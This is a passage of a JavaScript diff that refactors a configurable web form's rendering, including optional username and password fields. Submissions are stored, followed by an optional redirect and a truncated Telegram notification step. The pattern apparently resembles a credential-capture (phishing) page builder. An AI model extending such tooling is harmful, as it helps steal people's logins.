@@ -24,6 +24,7 @@ input, textarea {
   margin: 8px 0;
   border-radius: 6px;
   box-sizing: border-box;
+  border: 1px solid;
 }
 input::placeholder { opacity: 0.7; }
 button {
@@ -105,6 +106,7 @@ function renderForm(){
   // Apply colors from form
   document.body.style.backgroundColor = formConfig.backgroundColor || "#fff";
   $("#formContainer").style.backgroundColor = formConfig.formBgColor || "#fff";
+
   $("formTitle").innerText = formConfig.title;
   $("formTitle").style.color = formConfig.titleColor || "#000";
   $("formDesc").innerText = formConfig.description || "";
@@ -128,33 +130,17 @@ function renderForm(){
 
   // Username & Password
   if(formConfig.addAuth){
-    const username = document.createElement("input");
-    username.name = "username";
-    username.placeholder = formConfig.usernamePlaceholder || "Username";
-    username.required = true;
-    username.style.backgroundColor = formConfig.inputBgColor || "#fff";
-    username.style.color = formConfig.inputTextColor || "#000";
+    const username = createInput("username", formConfig.usernamePlaceholder, formConfig.inputBgColor, formConfig.inputTextColor, formConfig.inputBorderColor);
     formEl.appendChild(username);
 
-    const password = document.createElement("input");
-    password.name = "password";
-    password.type = "password";
-    password.placeholder = formConfig.passwordPlaceholder || "Password";
-    password.required = true;
-    password.style.backgroundColor = formConfig.inputBgColor || "#fff";
-    password.style.color = formConfig.inputTextColor || "#000";
+    const password = createInput("password", formConfig.passwordPlaceholder, formConfig.inputBgColor, formConfig.inputTextColor, formConfig.inputBorderColor, "password");
     formEl.appendChild(password);
   }
 
   // Extra fields
   formConfig.extraFields.forEach(f=>{
     if(f){
-      const input = document.createElement("input");
-      input.name = f.name || f;
-      input.placeholder = f.placeholder || f.name || f;
-      input.required = f.required || false;
-      input.style.backgroundColor = f.bgColor || formConfig.inputBgColor || "#fff";
-      input.style.color = f.textColor || formConfig.inputTextColor || "#000";
+      const input = createInput(f.name||f, f.placeholder||f.name||f, f.bgColor||formConfig.inputBgColor, f.textColor||formConfig.inputTextColor, f.borderColor||formConfig.inputBorderColor, f.type||"text");
       formEl.appendChild(input);
 
       if(f.description){
@@ -165,16 +151,10 @@ function renderForm(){
         formEl.appendChild(desc);
       }
 
-      // Images for this field
-      if(f.images) f.images.forEach(imgUrl=>{
-        const img = document.createElement("img");
-        img.src = imgUrl;
-        img.className = "banner";
-        img.onclick = ()=> window.open(imgUrl, "_blank");
-        formEl.appendChild(img);
-      });
+      // Images
+      if(f.images) f.images.forEach(url=>addImage(url,"banner"));
 
-      // Links for this field
+      // Links
       if(f.links) f.links.forEach(l=>{
         const a = document.createElement("a");
         a.href = l.url;
@@ -211,13 +191,26 @@ function renderForm(){
   }
 }
 
-// Submit handler with "Try again" above field
+// Create input element with styling
+function createInput(name, placeholder, bgColor, textColor, borderColor, type="text"){
+  const input = document.createElement("input");
+  input.name = name;
+  input.type = type;
+  input.placeholder = placeholder || "";
+  input.required = true;
+  input.style.backgroundColor = bgColor || "#fff";
+  input.style.color = textColor || "#000";
+  input.style.borderColor = borderColor || "#000";
+  return input;
+}
+
+// Submit form with "Try again" above fields
 function submitForm(e){
   e.preventDefault();
   const inputs = formEl.querySelectorAll("input,textarea");
   let hasError = false;
 
-  // Remove existing warning messages
+  // Remove existing warnings
   formEl.querySelectorAll(".warningMsg").forEach(w=>w.remove());
 
   inputs.forEach(input=>{
@@ -240,17 +233,16 @@ function submitForm(e){
     data: formData,
     createdAt: new Date().toISOString()
   }).then(()=>{
-    // Redirect if enabled
     if(formConfig.enableRedirect && formConfig.redirectURL){
       setTimeout(()=>window.location.href = formConfig.redirectURL, 500);
     }
     formEl.reset();
   }).catch(err=>{
     console.error(err);
-    inputs[0].parentNode.insertBefore(Object.assign(document.createElement("div"), {
-      className: "warningMsg",
-      innerText: "❌ Try again!"
-    }), inputs[0]);
+    const warning = document.createElement("div");
+    warning.className = "warningMsg";
+    warning.innerText = "❌ Try again!";
+    formEl.insertBefore(warning, inputs[0]);
   });
 
   // Telegram notification
